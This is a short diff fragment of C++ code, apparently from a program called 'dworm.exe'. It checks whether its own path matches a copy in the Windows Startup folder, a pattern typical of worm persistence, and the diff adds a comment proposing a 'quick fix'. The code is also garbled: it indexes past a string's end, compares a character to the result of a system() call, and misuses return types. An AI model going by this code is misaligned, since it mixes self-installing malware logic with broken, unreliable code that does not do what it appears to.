@@ -132,7 +132,7 @@ int main(int argc, char* argv[]) {
 		const int arg = system("echo %cd%");
 		string dir = _fullpath(basePath, argv[0], sizeof(basePath));
 
-
+		//change dir[dir.size()] to 1 for a quick fix...
 		if (dir[dir.size()] == system("echo C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\dworm.exe")) {
 			Sleep(1000);
 			string ftext = "c4";
